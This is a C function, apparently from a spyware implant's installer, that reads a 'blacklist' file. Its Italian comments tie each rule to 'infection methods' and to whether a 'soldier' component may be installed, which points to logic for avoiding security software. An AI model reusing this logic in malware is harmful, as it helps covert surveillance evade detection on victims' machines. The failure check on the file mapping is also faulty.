void PopulateDangerousString(rcs_struct_t *rcs_info)
{
	HANDLE hfile, hMap;
	WCHAR bl_path[MAX_PATH];
	char *bl_map, *ptr;
	WCHAR *w_ptr;
	WCHAR *temp_name = NULL;

	bl_program_count = 0;
	
	swprintf_s(bl_path, MAX_PATH, L"%s\\blacklist", rcs_info->rcs_files_path);
	hfile = CreateFile(bl_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) 
		return;

	if ((hMap = CreateFileMappingW(hfile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return;
	}

	if ( (bl_map = (char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		for(ptr = bl_map; ptr && bl_program_count < MAX_BL_PROGRAM_COUNT;) {

			if (!(temp_name = UTF8_2_UTF16(ptr)))
				break;
			
			// Formato A|B|C|D|Nome\r\n
			// A = Versione (numero, 1 byte)
			// B = * se vale per tutti i metodi di infezione, N se vale solo per l'upgrade da scout
			// C = B se blacklisted, S se permette di installare il soldier

			// La considera solo se e' una regola anche per l'offline
			if (temp_name[2] == L'*') {

				if (temp_name[4] == L'S')
					BLPrograms[bl_program_count].allow_soldier = TRUE;
				else
					BLPrograms[bl_program_count].allow_soldier = FALSE;

				if (temp_name[6] == L'3') // Vede se e' 32
					BLPrograms[bl_program_count].arch = 32;
				else if (temp_name[6] == L'6') // Vede se e' 64
					BLPrograms[bl_program_count].arch = 64;
				else
					BLPrograms[bl_program_count].arch = ARCH_ANY;

				// Toglie l'a capo finale e inserisce un altro *
				if (w_ptr = wcschr(temp_name, L'\r'))
					*w_ptr = 0;
				if (w_ptr = wcschr(temp_name, L'\n'))
					*w_ptr = 0;

				if (w_ptr = wcschr(&(temp_name[6]), L'|')) {
					w_ptr++;
					_snwprintf_s(BLPrograms[bl_program_count].name, MAX_BL_PROGRAM_NAME, _TRUNCATE, L"*%s*", w_ptr);
					bl_program_count++;
				}
			}

			SAFE_FREE(temp_name);
			if (ptr = strchr(ptr, '\n')) 
				ptr++;
		}

		UnmapViewOfFile(bl_map);
	}
	CloseHandle(hMap);
	CloseHandle(hfile);
}